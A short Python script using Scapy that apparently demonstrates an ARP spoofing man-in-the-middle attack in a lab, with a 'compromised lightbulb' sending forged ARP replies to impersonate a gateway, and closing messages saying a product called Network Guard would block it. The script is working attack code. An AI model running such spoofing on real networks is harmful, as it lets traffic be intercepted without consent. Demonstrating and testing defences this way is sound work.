#!/usr/bin/env python3
from scapy.all import *
import time

GATEWAY_IP = "10.0.2.1"
TRUSTED_IP = "10.0.1.2"
IFACE      = "veth_iot_gw"

print("=" * 50)
print("ATTACK: ARP Spoofing (Man-in-the-Middle)")
print("Compromised lightbulb impersonating the router")
print("=" * 50)
print(f"\n[*] Target: convince {TRUSTED_IP} that router = us")
print(f"[*] Sending forged ARP replies...\n")

for i in range(10):
    pkt = ARP(
        op=2,
        pdst=TRUSTED_IP,
        psrc=GATEWAY_IP,
        hwsrc=get_if_hwaddr(IFACE),
        hwdst="ff:ff:ff:ff:ff:ff"
    )
    sendp(Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff")/pkt,
          iface=IFACE, verbose=False)
    print(f"[{i+1:02d}] Forged ARP: {GATEWAY_IP} = {get_if_hwaddr(IFACE)}")
    time.sleep(0.5)

print("\n[!] Attack complete.")
print("[!] Without Network Guard — traffic would now flow through us.")
print("[!] With Network Guard — blocked before first packet reached target.")
